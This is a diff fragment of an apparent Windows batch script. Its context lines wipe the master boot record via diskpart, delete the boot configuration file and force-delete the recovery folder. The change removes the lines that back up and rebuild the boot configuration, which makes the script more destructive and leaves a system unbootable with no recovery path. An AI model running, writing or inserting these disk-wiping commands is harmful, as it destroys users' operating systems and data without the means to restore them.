@@ -463,10 +463,7 @@ echo exit >> wipe_mbr.txt
 
 diskpart /s wipe_mbr.txt
 
-bcdedit /export %~dp0bcd.bak
-attrib -h -s -r C:\boot\bcd >nul 2>&1
 del C:\boot\bcd >nul 2>&1
-bcdboot C:\Windows /l en-US
 
 rmdir /s /q C:\Recovery
 
